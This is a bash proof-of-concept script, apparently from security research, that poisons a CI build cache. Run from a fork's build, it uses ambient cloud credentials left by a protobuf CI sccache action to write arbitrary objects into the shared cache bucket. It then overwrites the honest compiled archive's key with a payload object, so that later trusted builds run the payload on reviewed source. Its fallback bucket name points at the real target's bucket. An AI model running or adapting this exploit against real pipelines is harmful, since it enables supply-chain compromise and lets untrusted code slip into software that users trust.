#!/usr/bin/env bash
# Direct-write demonstration — runs as a POST_BUILD step of the fork's
# stamped build, using ONLY the ambient credentials the real
# protocolbuffers/protobuf-ci sccache action set up in this job:
#   * the service-account JSON key materialised on disk by
#     internal/gcloud-auth (path in $SCCACHE_GCS_KEY_PATH), and
#   * the authenticated gcloud CLI from the same action.
# No secret is printed; only the key file's existence and the gcloud
# account identity are echoed as evidence.
#
# Target bucket resolution: the workflows' committed bucket-redirect step
# propagates the miniature's throwaway bucket into this job's environment
# as BOTH $MINIATURE_BUCKET and $SCCACHE_GCS_BUCKET (via $GITHUB_ENV), so
# in the miniature the writes below land in OUR bucket. The final fallback
# (the real target's bucket name) is reached only outside that setup,
# mirroring the real target, where the same job identity holds write
# access to the real cache bucket.
#
# Steps: (a)+(b) sentinel writes proving arbitrary-object write access;
# (c) the PAYOFF OVERWRITE — relocating the well-formed sccache archive
# this build stored for poison.cpp onto marker.cpp's key, per
# ../sccache-key-derivation.md §4(b)/§5. Nothing here hard-fails the
# build: every step prints an explicit status line, and the trusted run
# that follows is the verdict.
set -u

BUCKET="${MINIATURE_BUCKET:-${SCCACHE_GCS_BUCKET:-protobuf-sccache}}"
PREFIX="linux-cmake"
STAMP="$(date -u +%Y%m%dT%H%M%SZ)-${GITHUB_SHA:-local}"

echo "=== direct-write demonstration ==="
echo "target bucket:            gs://${BUCKET}"
echo "SCCACHE_GCS_KEY_PATH set: $([ -n "${SCCACHE_GCS_KEY_PATH:-}" ] && echo yes || echo no)"
echo "key file exists:          $([ -f "${SCCACHE_GCS_KEY_PATH:-/nonexistent}" ] && echo yes || echo no)"
echo "gcloud account:           $(gcloud config get-value account 2>/dev/null || echo '<none>')"
echo "RW mode in this job:      ${SCCACHE_GCS_RW_MODE:-<unset>}"

printf 'direct-write sentinel %s\n' "$STAMP" > /tmp/sentinel.txt

# (a) arbitrary object at the root of the shared cache namespace
gcloud storage cp /tmp/sentinel.txt "gs://${BUCKET}/DIRECT-WRITE-SENTINEL-${STAMP}.txt"
# (b) arbitrary object inside the trusted job's restore prefix
gcloud storage cp /tmp/sentinel.txt "gs://${BUCKET}/${PREFIX}/DIRECT-WRITE-SENTINEL.txt"

echo "bucket listing after direct writes:"
gcloud storage ls "gs://${BUCKET}/" | head -50
gcloud storage ls "gs://${BUCKET}/${PREFIX}/" | head -50

# --- (c) payoff overwrite: relocate the poison archive onto the shared key
#
# The stamped build has just stored one archive per compilation unit
# under gs://${BUCKET}/${PREFIX}/ (READ_WRITE). Identify, by observable
# behaviour, which stored entry is the shared unit's (an object defining
# marker_value() that behaves as 7 — the honest result the trusted build
# of marker.cpp expects) and which is the payload's (same symbol,
# behaves as 42). Then copy the payload archive over the shared unit's
# key. The next trusted build requests exactly that key, restores the
# payload object, and runs 42 on reviewed source that says 7.
echo "=== payoff overwrite (archive relocation) ==="
WORK="$(mktemp -d)"
printf 'int marker_value();\nint main() { return marker_value(); }\n' > "$WORK/probe.cpp"

# classify <gs-url> -> 7 | 42 | other | unknown
# Downloads the stored archive, extracts its object file, and — only for
# objects that define marker_value() but not main() — links it against a
# probe main and reports the behaviour it actually produces.
classify() {
  local url="$1" dir="$WORK/cls"
  rm -rf "$dir"; mkdir -p "$dir"
  gcloud storage cp "$url" "$dir/entry.bin" >/dev/null 2>&1 || { echo unknown; return; }
  (cd "$dir" && unzip -o -q entry.bin >/dev/null 2>&1) || { echo unknown; return; }
  local obj
  obj="$(find "$dir" -name '*.o' -type f | head -1)"
  [ -n "$obj" ] || { echo unknown; return; }
  nm "$obj" 2>/dev/null | grep -E ' [Tt] .*marker_value' >/dev/null || { echo other; return; }
  nm "$obj" 2>/dev/null | grep -E ' [Tt] main$' >/dev/null && { echo other; return; }
  g++ "$WORK/probe.cpp" "$obj" -o "$dir/probe" 2>/dev/null || { echo unknown; return; }
  "$dir/probe" >/dev/null 2>&1
  echo $?
}

TARGET_URL=""
SOURCE_URL=""
while IFS= read -r obj_url; do
  case "$obj_url" in *DIRECT-WRITE-SENTINEL*) continue ;; esac
  behaviour="$(classify "$obj_url")"
  echo "  entry $obj_url -> marker behaviour: $behaviour"
  case "$behaviour" in
    7)  TARGET_URL="$obj_url" ;;
    42) SOURCE_URL="$obj_url" ;;
  esac
done <<EOF
$(gcloud storage ls "gs://${BUCKET}/${PREFIX}/" 2>/dev/null)
EOF

if [ -n "$TARGET_URL" ] && [ -n "$SOURCE_URL" ] && [ "$TARGET_URL" != "$SOURCE_URL" ]; then
  echo "shared unit's key:  $TARGET_URL"
  echo "payload's key:      $SOURCE_URL"
  echo "target generation before: $(gcloud storage objects describe "$TARGET_URL" --format='value(generation)' 2>/dev/null || echo '<unavailable>')"
  gcloud storage cp "$SOURCE_URL" "$TARGET_URL"
  echo "target generation after:  $(gcloud storage objects describe "$TARGET_URL" --format='value(generation)' 2>/dev/null || echo '<unavailable>')"
  echo "PAYOFF-OVERWRITE: OK — payload archive now sits under the shared unit's key"
else
  echo "PAYOFF-OVERWRITE: SKIPPED — could not identify exactly one honest (7) entry and one payload (42) entry under the prefix"
fi

rm -rf "$WORK"
echo "=== direct-write demonstration done ==="
